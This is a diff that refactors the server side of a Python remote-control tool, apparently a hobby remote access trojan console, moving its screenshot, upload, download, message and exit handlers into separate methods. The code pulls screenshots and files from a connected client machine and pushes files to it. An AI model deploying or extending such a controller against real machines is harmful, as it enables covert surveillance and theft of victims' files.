@@ -1,6 +1,5 @@
 #!/usr/bin/env python3
 
-from operator import contains
 import socket
 import subprocess
 import os
@@ -35,13 +34,84 @@ class SERVER:
         clientip = client.recv(1024).decode()
         print(f'Connection established with {clientip}')
 
-    # handling user input for the commands later on in the program. Needed to be encoded
+    def exit(self):
+        bye = pyfiglet.figlet_format('BYE')
+        print(bye)
+        client.send(command.encode())
+        out = client.recv(1024)
+        out = out.decode()
+        print(out)
+        sock.close()
+        client.close()
+        return
 
+    def upload(self):
+        filename = str(input('What file would you like to upload include extension: '))
+        file = open(filename, "rb")
+        bytes = file.read(1024)
+        base64_bytes = base64.b64encode(bytes)
+        file_json = {
+                        "name": file.name,
+                        "data": base64_bytes.decode()
+                    }
+        file_send = json.dumps(file_json)
+        client.send(command.encode())
+        client.send(file_send.encode())
+        self.progressbar()
+        print('File uploaded!')
+    
+    # handling user input for the commands later on in the program. Needed to be encoded
     def send_data(self):
         client.send(command.encode())
         data_output = client.recv(1024).decode()
         print(data_output)
 
+    def sendmessage(self):
+        client.send(command.encode())
+        message = str(input('What would you like to say: '))
+        client.send(message.encode())
+        print('Message Sent!')
+    
+    def screenshot(self):
+        client.send(command.encode())
+        file = client.recv(2147483647)
+        dt = datetime.now()
+        ts = datetime.timestamp(dt)
+        filename = 'screenshot' + str(ts) + '.png'
+        with open(filename, 'wb') as open_file:
+            open_file.write(file)
+            open_file.close()
+            self.progressbar()
+        print("Screenshot Downloaded!")
+        
+    def download(self):
+        try:
+            json_data = client.recv(600000).decode()
+            convert_json = json.loads(json_data)
+            name = convert_json['name']
+            bytes = convert_json['data']
+            b64decoded_bytes = base64.b64decode(bytes)
+            print(name)
+            if '.' in name:
+                file_name = name.split('.')
+                # open in binary
+                file = open(f"{file_name[0]}" + '.' + f"{file_name[1]}", 'wb')
+                # receive data and write it to file
+                file.write(b64decoded_bytes)
+                self.progressbar()
+                print('File downloaded!')
+                file.close()
+            else:
+                file = open(str(name), "wb")
+                file.write(b64decoded_bytes)
+                self.progressbar()
+                print("File downloaded!")
+                file.close()
+        except:
+            err = "file doesn't exist, check your spelling/extension"
+            print(err)
+                                  
+    
     def progressbar(self):
         toolbar_width = 40
 
@@ -53,7 +123,7 @@ class SERVER:
 
         for i in range(toolbar_width):
             time.sleep(0.01)  # do real work here
-    # update the bar
+            # update the bar
             sys.stdout.write("-")
             sys.stdout.flush()
 
@@ -98,88 +168,26 @@ class SERVER:
                             continue
                         elif command[:5] == 'rmdir':
                             continue
-                        try:
-                            if command[:8] == 'download':
-                                json_data = client.recv(600000).decode()
-                                convert_json = json.loads(json_data)
-                                name = convert_json['name']
-                                bytes = convert_json['data']
-                                b64decoded_bytes = base64.b64decode(bytes)
-                                print(name)
-                                if '.' in name:
-                                    file_name = name.split('.')
-                                    # open in binary
-                                    file = open(
-                                        f"{file_name[0]}" + '.' + f"{file_name[1]}", 'wb')
-                                    # receive data and write it to file
-                                    file.write(b64decoded_bytes)
-                                    self.progressbar()
-                                    print('File downloaded!')
-                                    file.close()
-                                    command = ''
-                                    continue
-                                else:
-                                    file = open(str(name), "wb")
-                                    file.write(b64decoded_bytes)
-                                    self.progressbar()
-                                    print("File downloaded!")
-                                    file.close()
-                                    command = ''
-                                    continue
-                        except:
-                            err = "file doesn't exist, check your spelling/extension"
-                            print(err)
+                        if command[:8] == 'download':
+                            self.download()
                             continue
                         data_output = client.recv(1024).decode()
                         print(data_output)
 
                 case 'screenshot':
-                    client.send(command.encode())
-                    file = client.recv(2147483647)
-                    dt = datetime.now()
-                    ts = datetime.timestamp(dt)
-                    filename = 'screenshot' + str(ts) + '.png'
-                    with open(filename, 'wb') as open_file:
-                        open_file.write(file)
-                        open_file.close()
-                    self.progressbar()
-                    print("Screenshot Downloaded!")
+                    self.screenshot()
 
                 case 'sendmessage':
-                    client.send(command.encode())
-                    message = str(input('What would you like to say: '))
-                    client.send(message.encode())
-                    print('Message Sent!')
+                    self.sendmessage()
 
                 case 'upload':
-                    filename = str(
-                        input('What file would you like to upload include extension: '))
-                    file = open(filename, "rb")
-                    bytes = file.read(1024)
-                    base64_bytes = base64.b64encode(bytes)
-                    file_json = {
-                        "name": file.name,
-                        "data": base64_bytes.decode()
-                    }
-                    file_send = json.dumps(file_json)
-                    client.send(command.encode())
-                    client.send(file_send.encode())
-                    self.progressbar()
-                    print('File uploaded!')
+                    self.upload()
 
                 case 'help':
                     self.prompts()
 
                 case 'exit':
-                    bye = pyfiglet.figlet_format('BYE')
-                    print(bye)
-                    client.send(command.encode())
-                    out = client.recv(1024)
-                    out = out.decode()
-                    print(out)
-                    sock.close()
-                    client.close()
-                    return
+                    self.exit()
 
 
 # setting host port and ip to construct with the server class
